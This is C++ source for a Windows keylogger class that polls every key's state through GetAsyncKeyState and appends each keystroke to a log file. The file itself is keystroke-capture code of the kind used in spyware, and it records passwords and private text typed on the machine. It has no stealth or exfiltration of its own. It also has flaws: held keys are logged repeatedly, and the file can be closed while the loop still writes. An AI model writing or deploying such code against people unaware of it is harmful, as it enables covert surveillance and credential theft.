#include "KeyboardLogger.h"
#include <fstream>
#include <chrono>
#include <ctime>
#include <unordered_map>
#include <windows.h>

KeyboardLogger::KeyboardLogger(const std::string& logFileName) : logFileName_(logFileName) {}

void KeyboardLogger::startLogging() {
    isLogging_ = true;
    logFile_.open(logFileName_, std::ios_base::app);

    while (isLogging_) {
        // Sleep cpu usage
        Sleep(10);

        for (int i = 8; i <= 255; i++) {
            SHORT result = GetAsyncKeyState(i);
            bool isPressed = result & 0x8000;

            if (isPressed) {
                if (specialKeys_.count(i) > 0) {
                    logFile_ << specialKeys_[i] << std::endl;
                }
                else {
                    char c = MapVirtualKeyA(i, MAPVK_VK_TO_CHAR);
                    logFile_ << c << std::endl;
                }
            }
        }
    }

    logFile_.close();
}

void KeyboardLogger::stopLogging() {
    isLogging_ = false;
    logFile_.close();
}
